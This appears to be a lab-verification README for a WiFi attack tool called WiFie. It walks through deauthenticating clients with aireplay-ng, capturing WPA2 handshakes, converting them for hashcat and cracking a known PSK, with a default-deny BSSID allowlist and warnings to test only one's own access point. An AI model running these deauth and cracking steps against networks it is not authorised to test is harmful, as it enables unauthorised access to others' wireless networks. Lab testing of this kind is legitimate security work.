# Lab verification — N4

End-to-end walkthrough that proves the offensive pipeline actually
works against your own hardware: deauth → EAPOL capture → hashcat
22000 conversion → crack with a known PSK.

This is a **manual** milestone. Read every step before running it.
Only run it against an AP you control.

> **Hardware status:** the Alfa USB adapter on this machine is
> validated for WPA2 capture/crack. KRACK and SAE-downgrade flows
> need injection capabilities that haven't been exercised against
> this specific adapter — verify those last, with an "expected
> failure" budget.

---

## Step 0 — One-time setup

```bash
# Build deps + offline tools
sudo dnf install -y libpcap-devel pkgconf-pkg-config \
                    aircrack-ng hashcat hcxtools iw

# Grant the backend the caps it needs (so you don't need sudo each run)
cd ~/wifi/wifie
./run.sh --build-only
sudo setcap cap_net_admin,cap_net_raw=eip target/debug/wifie-server
```

Optional but recommended: a tiny wordlist that **contains your lab
PSK** (so hashcat will actually crack it):

```bash
mkdir -p ~/wifie-lab && cd ~/wifie-lab
printf 'wrong-guess-1\nwrong-guess-2\nMY_LAB_PSK\nwrong-guess-3\n' > test.wordlist
```

## Step 1 — Identify the lab AP

Pick a SSID + BSSID + channel you own. Quick recon with the Alfa:

```bash
sudo nmcli dev set wlp0s20f0u1i3 managed no   # release the adapter once
sudo iw dev wlp0s20f0u1i3 scan | egrep 'BSS |SSID|freq|primary channel' | head -40
```

Note the **BSSID** (e.g. `AA:BB:CC:DD:EE:FF`), the **channel
frequency in MHz** (e.g. `2412` for ch 1, `5180` for ch 36), and
ideally a connected client MAC (helpful for targeted deauth — without
one you wait for a natural reconnect).

## Step 2 — Authorize the BSSID

The auth gate is opt-in: every offensive route checks
`WIFIE_LAB_AUTHORIZED_BSSIDS`. Unset means deny-everything.

```bash
export WIFIE_LAB_AUTHORIZED_BSSIDS="AA:BB:CC:DD:EE:FF"
# (comma- or whitespace-separated for multiple)
```

## Step 3 — Boot WiFie

```bash
cd ~/wifi/wifie
./run.sh
# open http://localhost:5173 (or http://<host>:5173 if you're SSH'd in)
```

Confirm in the **Notes card** at the bottom of the dashboard that
your BSSID appears under "Lab authorization." If it doesn't, stop —
the env var didn't reach the backend, and every offensive request
will 403 with `not_authorized`.

## Step 4 — Put the Alfa into monitor mode + pin the channel

Inside the dashboard's **Interface management** panel:

1. Select your Alfa adapter (e.g. `wlp0s20f0u1i3`).
2. Toggle **Monitor Mode → on**. Telemetry auto-binds; you should
   start seeing packets-per-second tick up in the **Packet Telemetry**
   card.
3. Set the **Channel frequency** to your AP's MHz value and apply.

Sanity check from another terminal:

```bash
iw dev wlp0s20f0u1i3 info | grep -E 'type|channel'
# expected: type monitor, channel <your channel>
```

## Step 5 — Queue the handshake capture

In the **Capture** panel:

1. **Target BSSID** = your lab AP's MAC.
2. **Client (optional)** = a connected station's MAC if you have it.
   Leave empty for a pure passive wait.
3. **Capture mode** = `WPA2 4-way handshake`.
4. Click **Queue capture**.

Under the hood the backend will:

* `start_capture(iface, "ether proto 0x888e")` — pcap with an EAPOL
  filter on the kernel side.
* If you ticked deauth (or you POST'd `deauth: true`), spawn
  `aireplay-ng -0 <count> -a <bssid> [-c <client>] <iface>` ~300ms
  in to nudge the client into reauthing.
* Stream every captured frame into `<id>.pcap` under
  `~/.local/share/wifie/captures/`.
* Stop after `MAX_EAPOL_FRAMES` (8) or 60s of timeout — whichever
  first.
* On success, run `hcxpcapngtool -o <id>.22000 <id>.pcap`.

You'll see a row appear in **Recent tasks** with status moving
`pending → running → complete`. The EAPOL counter ticks up as
frames land. When it flips to `complete`, two download chips appear:
`.pcap` and `.22000`.

If the row goes `failed`:

| Error                                            | Likely cause                                                            |
|--------------------------------------------------|-------------------------------------------------------------------------|
| `not_authorized`                                 | BSSID not in `WIFIE_LAB_AUTHORIZED_BSSIDS`. See step 2.                 |
| `aireplay-ng not installed`                      | `sudo dnf install aircrack-ng`.                                         |
| `no EAPOL frames captured`                       | Wrong channel, too far from AP, or no client to deauth. Try again.      |
| `tool_missing: hcxpcapngtool` (in conversion_error) | `sudo dnf install hcxtools`. Capture itself was fine.                |

## Step 6 — Download + crack

Click the `.22000` chip, save the file. Then:

```bash
cd ~/wifie-lab
hashcat -m 22000 ~/Downloads/wifie-<id>.22000 test.wordlist
hashcat -m 22000 ~/Downloads/wifie-<id>.22000 test.wordlist --show
```

`--show` should print a line that ends with your known PSK. **That
line is the verification.** Anything else (no recovered hash, status
"Exhausted", an empty `.22000`) means the pipeline produced an
artifact that isn't a valid 4-way handshake — usually a
"didn't capture all four EAPOL messages" issue. Re-run with deauth
enabled and a known client MAC.

## Step 7 — Tear down

```bash
# Stop wifie (Ctrl+C in the run.sh terminal)
# Hand the radio back to NetworkManager
sudo nmcli dev set wlp0s20f0u1i3 managed yes
unset WIFIE_LAB_AUTHORIZED_BSSIDS
```

The captured pcaps stay on disk under `~/.local/share/wifie/captures/`.
Treat those as sensitive — they contain enough material to crack the
network's PSK.

---

## What "verified" means

The pipeline is verified for WPA2 once a single clean run lands the
known PSK back from hashcat. After that:

* WPA3 PMKID — the same UI flow with capture mode `wpa3_pmkid` and a
  WPA3-SAE AP. PMKID lives in the first association message rather
  than EAPOL-Key M1; the current filter expects EAPOL, so this path
  is **not yet validated** — see N10 in CLAUDE.md.
* Vuln-lab tests (Dragonblood, KRACK) — separate runners, separate
  hardware caveats. Validate WPA2 first.
